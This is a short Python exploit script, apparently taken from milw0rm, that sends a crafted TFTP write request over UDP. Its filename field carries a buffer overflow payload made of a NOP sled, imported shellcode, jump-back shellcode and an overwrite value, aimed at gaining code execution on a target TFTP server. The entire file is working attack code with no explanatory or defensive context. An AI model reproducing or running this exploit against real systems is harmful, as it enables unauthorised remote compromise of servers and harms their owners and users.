import socket
from payload import buf

import struct
def shell_attack(target_machine, target_port):
   host = target_machine
   port = target_port

   try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   except:
      
      pass

   # Jump back shellcode
   sc = b"\x6a\x05\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x16\x91\x9c"
   sc +=b"\x30\x83\xeb\xfc\xe2\xf4\xcf\x7f\x45\x44\x32\x65\xc5\xb0\xd7\x9b"
   sc +=b"\x0c\xce\xdb\x6f\x51\xcf\xf7\x91\x9c\x30"


   

   filename = b"\x90"*860 + buf + b"\x90"*14 + sc + b"\xeb\xd0\x90\x90" + b"\x2b\x0e\x41"

   mode = b"netascii"

   muha = b"\x00\x02" + filename+ b"\0" + mode+ b"\0" 

  
   s.sendto(muha, (host, port))
 

   # milw0rm.com [2008-03-26]